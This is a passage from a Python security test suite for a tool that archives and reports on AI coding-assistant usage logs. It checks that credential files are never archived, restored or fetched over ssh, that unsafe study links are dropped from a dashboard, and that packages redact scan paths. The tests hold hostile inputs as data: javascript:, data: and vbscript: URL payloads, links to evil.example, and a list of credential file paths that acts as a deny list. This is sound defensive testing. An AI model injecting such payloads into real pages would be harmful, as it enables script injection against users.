    good_path = os.path.join(tmp, "sessions", "rollout-1.jsonl")
    os.makedirs(os.path.dirname(good_path))
    with open(good_path, "w", encoding="utf-8") as fh:
        fh.write('{"type": "session_meta"}\n')
    arch = ledger_archive.Archive(os.path.join(OUT, "arch-cred"))
    logs = []
    res = arch.archive_local("h", paths + [good_path], log=logs.append)
    indexed = sorted(r[0] for r in arch.db.execute("SELECT path FROM files WHERE host='h'"))
    l1 = res[0] == 1 and indexed == [good_path] and any("%d credential-like" % len(names) in x for x in logs)
    # the index refuses such a row whatever produced it
    l2 = _raises(lambda: arch._write("h", paths[0], b"x", 1, 0.0, "sha", False)) and sorted(r[0] for r in arch.db.execute("SELECT path FROM files WHERE host='h'")) == [good_path]
    # an index written before this rule may still hold one: restore skips it
    arch.db.execute("INSERT INTO files (host, path, rel, size, mtime, sha256, archived_at) VALUES (?,?,?,?,?,?,?)", ("h", paths[0], "x/auth.json", 1, 0.0, "sha", "2026-01-01T00:00:00+00:00"))
    arch.db.commit()
    to = os.path.join(tmp, "restored")
    n = arch.restore("h", to)
    restored = [os.path.join(dp, fn) for dp, _, fns in os.walk(to) for fn in fns]
    l3 = n == 1 and len(restored) == 1 and restored[0].endswith("rollout-1.jsonl")
    # collect_sources drops them before any code path sees them
    scans = os.path.join(OUT, "scans-cred")
    os.makedirs(os.path.join(scans, "h"), exist_ok=True)
    with open(os.path.join(scans, "h", "events.h.jsonl"), "w", encoding="utf-8") as fh:
        for p in paths + [good_path]:
            fh.write(json.dumps({"src": p}) + "\n")
    srcs, _ = ledger_archive.collect_sources(scans, "h")
    l4 = srcs == {good_path}
    # ssh path: only credential-like paths remain, so no ssh process may start
    import subprocess as sp
    calls = []
    real_run, real_popen = sp.run, sp.Popen

    def spy(*a, **k):
        calls.append(a[0])
        raise RuntimeError("ssh must not be called")
    sp.run, sp.Popen = spy, spy
    remote = ["/home/u/.codex/auth.json", "/home/u/.claude/.credentials.json", "/home/u/x/credentials.json", "/home/u/x/token.json", "/home/u/x/x.pem", "/home/u/x/x.key", "/home/u/.env", "/home/u/.ssh/config", "/home/u/.aws/credentials"]
    logs = []
    try:
        res = arch.archive_ssh("h", {"ssh": "user@host"}, remote, log=logs.append)
    finally:
        sp.run, sp.Popen = real_run, real_popen
    arch.close()
    l5 = res == (0, 0, 0) and not calls and any("%d credential-like" % len(remote) in x for x in logs)
    good = l1 and l2 and l3 and l4 and l5
    print("archive-cred: local dropped %s, index refuses %s, restore skips %s, collect_sources drops %s, ssh never starts %s  %s" % (l1, l2, l3, l4, l5, "OK" if good else "FAIL"))
    return good



def check_study_url(compiled):
    """#11: the 'Read the study' link renders only for an absolute https URL. javascript:, data:, protocol-relative,
    http: and whitespace-wrapped values (from STUDY_URL or the report config) are dropped with a warning and never
    reach the page; a valid https value is embedded and the anchor is built with DOM APIs (rel=noopener noreferrer)."""
    summary = os.path.join(compiled, "summary.json")
    dashboard = os.path.join(SCRIPTS, "build_dashboard.py")
    hostile = ["javascript:alert(1)", "JavaScript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)", "//evil.example/study", "http://evil.example/study", " https://evil.example/x", "https://"]
    pred_ok = all(_raises(lambda v=v: safety.validate_study_url(v)) for v in hostile) and safety.validate_study_url("https://example.org/study") == "https://example.org/study" and safety.validate_study_url("") == ""
    results = [("predicate", pred_ok, "")]

    def page_clean(h):
        return h and 'href="javascript' not in h and "javascript:" not in h and "vbscript:" not in h and "evil.example" not in h and '"study_url": ""' in h and "data:text/html" not in h
    for i, val in enumerate(hostile):
        dash = os.path.join(OUT, "study-env-%d.html" % i)
        env = dict(os.environ)
        env["STUDY_URL"] = val
        r = run([PY, dashboard, summary, dash], env=env)
        h = open(dash, encoding="utf-8").read() if os.path.isfile(dash) else ""
        good = r.returncode == 0 and bool(page_clean(h)) and "study_url" in r.stderr.lower() and "dropped" in r.stderr
        results.append(("env %s" % val.split(":")[0].strip()[:10], good, "rc=%s warned=%s" % (r.returncode, "dropped" in r.stderr)))
    cfg_bad = os.path.join(OUT, "study-config-bad.json")
    json.dump({"study_url": "javascript:alert(1)"}, open(cfg_bad, "w", encoding="utf-8"))
    dash = os.path.join(OUT, "study-config-bad.html")
    env = dict(os.environ)
    env.pop("STUDY_URL", None)
    r = run([PY, dashboard, summary, dash, cfg_bad], env=env)
    h = open(dash, encoding="utf-8").read() if os.path.isfile(dash) else ""
    results.append(("config javascript", r.returncode == 0 and bool(page_clean(h)) and "dropped" in r.stderr, "rc=%s" % r.returncode))
    # a valid https link: embedded as data, rendered by DOM APIs (no href="https://..." in the static markup), warning-free
    for label, envval, cfgval in (("env https", "https://example.org/study", None), ("config https", None, "https://example.org/study")):
        dash = os.path.join(OUT, "study-good-%s.html" % label.split()[0])
        env = dict(os.environ)
        env.pop("STUDY_URL", None)
        cmd = [PY, dashboard, summary, dash]
        if envval:
            env["STUDY_URL"] = envval
        if cfgval:
            cfg_good = os.path.join(OUT, "study-config-good.json")
            json.dump({"study_url": cfgval}, open(cfg_good, "w", encoding="utf-8"))
            cmd.append(cfg_good)
        r = run(cmd, env=env)
        h = open(dash, encoding="utf-8").read() if os.path.isfile(dash) else ""
        good = r.returncode == 0 and '"study_url": "https://example.org/study"' in h and 'rel = "noopener noreferrer"' in h and "createElement(\"a\")" in h and "dropped" not in r.stderr and not EXTERNAL_REF.search(h)
        results.append((label, good, "rc=%s" % r.returncode))
    good = all(g for _, g, _ in results)
    print("study_url: " + "; ".join("%s %s%s" % (lb, "ok" if g else "FAIL", "" if g else " (%s)" % d) for lb, g, d in results) + "  %s" % ("OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-400:])
    return good



def check_package_sensitivity(compiled):
    """#16: every package carries SENSITIVITY.md, listed in README.md and Appendix B and bound by SHA256SUMS; by default
    ledger.json has no absolute scan root and no config block, and the study shows only the tail of each root.
    --package-paths (manifest package_paths: true) restores both. Returns the default package path for later checks."""
    scans = os.path.join(ROOT, "tests", "out", "pipeline", "scans")
    roots = []
    for host in os.listdir(scans) if os.path.isdir(scans) else []:
        for fn in os.listdir(os.path.join(scans, host)):
            if fn.startswith("inventory.") and fn.endswith(".json"):
                roots += [r["root"] for r in json.load(open(os.path.join(scans, host, fn), encoding="utf-8")).get("roots", []) if r.get("root")]
    roots = [r for r in roots if os.path.isabs(r)]
    cfgp = os.path.join(ROOT, "examples", "report_config.completetech.json")

    def build(name, extra):
        pkg = os.path.join(OUT, name)
        r = run([PY, os.path.join(SCRIPTS, "build_report.py"), "--compiled", compiled, "--scans", scans, "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out", pkg, "--date", "2026-09-09", "--tz", "UTC", "--config", cfgp] + extra)
        return pkg, r

    def leaks(text):
        return [r for r in roots if r in text or json.dumps(r)[1:-1] in text]
    results = []
    pkg, r = build("pkg-default", [])
    sens = os.path.join(pkg, "SENSITIVITY.md")
    sums = open(os.path.join(pkg, "SHA256SUMS"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg, "SHA256SUMS")) else ""
    readme = open(os.path.join(pkg, "README.md"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg, "README.md")) else ""
    report = open(os.path.join(pkg, "USAGE_REPORT.md"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg, "USAGE_REPORT.md")) else ""
    sens_text = open(sens, encoding="utf-8").read() if os.path.isfile(sens) else ""
    results.append(("sensitivity file", r.returncode == 0 and "publish-check" in sens_text and "host names" in sens_text.lower() and "omitted" in sens_text, ""))
    results.append(("listed", re.search(r"\bSENSITIVITY\.md\s*$", sums, re.M) is not None and "SENSITIVITY.md" in readme and "`SENSITIVITY.md`" in report, "sums=%s readme=%s report=%s" % ("SENSITIVITY.md" in sums, "SENSITIVITY.md" in readme, "SENSITIVITY.md" in report)))
    ltxt = open(os.path.join(pkg, "ledger.json"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg, "ledger.json")) else "{}"
    L = json.loads(ltxt)
    inv_roots = [x for i in L.get("scan_inventory", []) for x in i.get("roots", [])]
    results.append(("ledger.json redacted", bool(roots) and "config" not in L and inv_roots and all("root" not in x and x.get("tool") and x.get("root_tail") for x in inv_roots) and not leaks(ltxt) and not leaks(report),
                    "roots=%d config=%s leaks=%s" % (len(roots), "config" in L, (leaks(ltxt) + leaks(report))[:2])))
    pkg_paths, r2 = build("pkg-paths", ["--package-paths"])
    ltxt2 = open(os.path.join(pkg_paths, "ledger.json"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg_paths, "ledger.json")) else "{}"
    L2 = json.loads(ltxt2)
    sens2 = open(os.path.join(pkg_paths, "SENSITIVITY.md"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg_paths, "SENSITIVITY.md")) else ""
    results.append(("--package-paths keeps them", r2.returncode == 0 and "config" in L2 and len(leaks(ltxt2)) == len(roots) and "ARE included" in sens2, "rc=%s" % r2.returncode))
    # end to end: the pipeline's build step writes the notice into the real package and binds it
    r3 = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", os.path.join(ROOT, "examples", "manifest.fixtures.json"), "--only", "build"])
    ppkg = os.path.join(ROOT, "tests", "out", "pipeline", "reports", "Example_Ledger_2026-09-09")
    psums = open(os.path.join(ppkg, "SHA256SUMS"), encoding="utf-8").read() if os.path.isfile(os.path.join(ppkg, "SHA256SUMS")) else ""
    pledger = open(os.path.join(ppkg, "ledger.json"), encoding="utf-8").read() if os.path.isfile(os.path.join(ppkg, "ledger.json")) else "{}"
    results.append(("pipeline package", r3.returncode == 0 and os.path.isfile(os.path.join(ppkg, "SENSITIVITY.md")) and re.search(r"\bSENSITIVITY\.md\s*$", psums, re.M) is not None and not leaks(pledger) and '"config"' not in pledger, "rc=%s" % r3.returncode))
    good = all(g for _, g, _ in results)
    print("package:   " + "; ".join("%s %s%s" % (lb, "ok" if g else "FAIL", "" if g else " (%s)" % d) for lb, g, d in results) + "  %s" % ("OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-400:], r2.stderr[-400:], r3.stderr[-400:])
    return good, pkg



def check_unattributed(compiled, pkg):
    """#18: no shipped or drafted accounts file carries a catch-all rule; the fixture calls that match no rule appear as
    their own `unattributed` row (billing unknown) in summary.json, the dashboard and the study, with the count stated."""
    import detect_hosts
    files = {"templates/accounts.example.json": os.path.join(ROOT, "templates", "accounts.example.json"), "examples/accounts.fixtures.json": os.path.join(ROOT, "examples", "accounts.fixtures.json")}
    catchall = [n for n, p in files.items() if any(not r.get("when") for r in json.load(open(p, encoding="utf-8")).get("rules", []))]
    draft = detect_hosts.draft_accounts([{"name": "h1", "kind": "local", "codex_roots": ["/home/u/.codex"], "claude_roots": ["/home/u/.claude/projects"]}], read_credentials=False, warn=False)
    if any(not r.get("when") for r in draft.get("rules", [])):
        catchall.append("detect_hosts.draft_accounts")
    S = json.load(open(os.path.join(compiled, "summary.json"), encoding="utf-8"))
    acc = S.get("accounts") or {}
    row = next((r for r in acc.get("by_account", []) if r.get("account") == "unattributed"), None)
    tot = (acc.get("subscription_totals") or {}).get("unattributed") or {}
    summary_ok = all(r.get("when") for r in acc.get("rules", [])) and row is not None and row["calls"] > 0 and tot.get("billing") == "unknown" and not tot.get("subscription_usd")
    dash = os.path.join(OUT, "unattributed-dashboard.html")
    r = run([PY, os.path.join(SCRIPTS, "build_dashboard.py"), os.path.join(compiled, "summary.json"), dash])
    h = open(dash, encoding="utf-8").read() if os.path.isfile(dash) else ""
    dash_ok = r.returncode == 0 and "matched no rule" in h and '"account": "unattributed"' in h
    report = open(os.path.join(pkg, "USAGE_REPORT.md"), encoding="utf-8").read() if os.path.isfile(os.path.join(pkg, "USAGE_REPORT.md")) else ""
    n = "{:,}".format(row["calls"]) if row else "?"
    study_ok = "**Unattributed calls.** %s calls" % n in report and "matched no rule" in report and "| `unattributed` |" in report
    good = not catchall and summary_ok and dash_ok and study_ok
    print("unattributed: no catch-all rules %s; summary row %s; dashboard note %s; study count %s  %s" % (
        "ok" if not catchall else "FAIL (%s)" % ", ".join(catchall), "ok" if summary_ok else "FAIL", "ok" if dash_ok else "FAIL", "ok" if study_ok else "FAIL", "OK" if good else "FAIL"))
    return good


def main():
    shutil.rmtree(OUT, ignore_errors=True)
    os.makedirs(OUT, exist_ok=True)
    make_fixtures.build()
    compiled = os.path.join(ROOT, "tests", "out", "pipeline", "compiled")
    if not os.path.isfile(os.path.join(compiled, "summary.json")):
        r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", os.path.join(ROOT, "examples", "manifest.fixtures.json"), "--only", "scan,report,analyze"])
        if r.returncode:
            print(r.stderr[-800:])
    ok = check_sort_injection()
    ok = check_manifest_validation() and ok
    ok = check_manifest_ownership() and ok
    ok = check_wrapper() and ok
    ok = check_branding_and_pages(compiled) and ok
    ok = check_examples_self_contained() and ok
    ok = check_neutral_branding() and ok
    ok = check_credential_minimisation() and ok
    ok = check_persistence_consent() and ok
    ok = check_shared_predicates() and ok
    ok = check_followups_1_5_9() and ok
    ok = check_archive_boundaries() and ok
    ok = check_terminal_cleaning() and ok
    ok = check_credential_exclusion() and ok
    ok = check_private_permissions() and ok
    ok = check_generic_root_guard() and ok
    ok = check_private_run_files() and ok
    ok = check_output_permissions() and ok
    ok = check_study_url(compiled) and ok
    pkg_ok, default_pkg = check_package_sensitivity(compiled)
    ok = pkg_ok and ok
    ok = check_unattributed(compiled, default_pkg) and ok
    print("SECURITY OK" if ok else "SECURITY CHECKS FAILED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
